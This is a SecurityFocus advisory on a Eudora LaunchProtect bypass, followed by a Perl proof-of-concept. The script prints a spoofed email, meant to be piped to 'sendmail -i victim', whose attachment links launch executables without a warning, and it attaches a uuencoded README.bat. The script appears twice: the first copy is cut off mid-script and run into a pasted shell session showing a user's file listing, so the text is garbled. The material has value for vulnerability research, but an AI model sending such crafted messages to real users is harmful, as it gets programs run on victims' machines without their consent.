source: http://www.securityfocus.com/bid/9101/info

A problem has been identified in the implementation of LaunchProtect within Eudora. Because of this, it may be possible to trick users into performing dangerous actions.

** May 21, 2004 - Eudora version 6.1.1 has been released, however, it is reported that the new versions is vulnerable to this issue as well. 

#!/usr/bin/perl --

use MIME::Base64;

print "From: me\n";
print "To: you\n";
print "Subject: Eudora 6.0.1 on Windows spoof, LaunchProtect\n";
print "\n";

print "Pipe the output of this script into:   sendmail -i victim\n";

print "
Eudora 6.0.1 LaunchProtect handles the X-X.exe dichotomy in the attach
directory only, and allows spoofed attachments pointing to an executable
stored elsewhere to run without warning:\n";
print "Attachment Converted\r: <a href=c:/winnt/system32/calc>go.txt</a>\n";
print "Attachment Converted\r: c:/winnt/system32/calc\n";

$X = 'README'; $Y = "$X.bat";
print "\nThe X - X.exe dichotomy: send a plain $X attachment:\n";
$z = "rem Funny joke\r\npause\r\n";
flynn@mail:~$ ls
814BlackoutReport.pdf  administrivia  code                    flying    leth.txt     mergemail.pl  sfmutt.tgz  syngress
Maildir                backfill.txt   docs                    flynn     mail         pics          src         ware
admin                  check          eudora-launchprotex.pl  igss.txt  malcode.txt  scripts       survey
flynn@mail:~$ cat eudora-launchprotex.pl
#!/usr/bin/perl --

use MIME::Base64;

print "From: me\n";
print "To: you\n";
print "Subject: Eudora 6.0.1 on Windows spoof, LaunchProtect\n";
print "\n";

print "Pipe the output of this script into:   sendmail -i victim\n";

print "
Eudora 6.0.1 LaunchProtect handles the X-X.exe dichotomy in the attach
directory only, and allows spoofed attachments pointing to an executable
stored elsewhere to run without warning:\n";
print "Attachment Converted\r: <a href=c:/winnt/system32/calc>go.txt</a>\n";
print "Attachment Converted\r: c:/winnt/system32/calc\n";

$X = 'README'; $Y = "$X.bat";
print "\nThe X - X.exe dichotomy: send a plain $X attachment:\n";
$z = "rem Funny joke\r\npause\r\n";
print "begin 600 $X\n", pack('u',$z), "`\nend\n";
print "\nand (in another message or) after some blurb so is scrolled off in
another screenful, also send $Y. Clicking on $X does not
get it any more (but gets $Y, with a LauchProtect warning):\n";
$z = "rem Big joke\r\nrem Should do something nasty\r\npause\r\n";
print "begin 600 $Y\n", pack('u',$z), "`\nend\n";

print "
Can be exploited if there is more than one way into attach: in my setup
H: and \\\\rome\\home are the same thing, but Eudora does not know that.\n";
print "These elicit warnings:\n";
print "Attachment Converted\r: <a href=h:/eudora/attach/README>readme</a>\n";
print "Attachment Converted\r: h:/eudora/attach/README\n";
print "while these do the bad thing without warning:\n";
print "Attachment Converted\r: <a href=file://rome/home/eudora/attach/README>readme</a>\n";
print "Attachment Converted\r: //rome/home/eudora/attach/README\n";
print "Attachment Converted\r: \\\\rome\\home\\eudora\\attach\\README\n";

print "
For the default setup, Eudora knows that C:\\Program Files
and C:\\Progra~1 are the same thing...\n";
print "Attachment Converted\r: \"c:/program files/qualcomm/eudora/attach/README\"\n";
print "Attachment Converted\r: \"c:/progra~1/qualcomm/eudora/attach/README\"\n";

print "\n";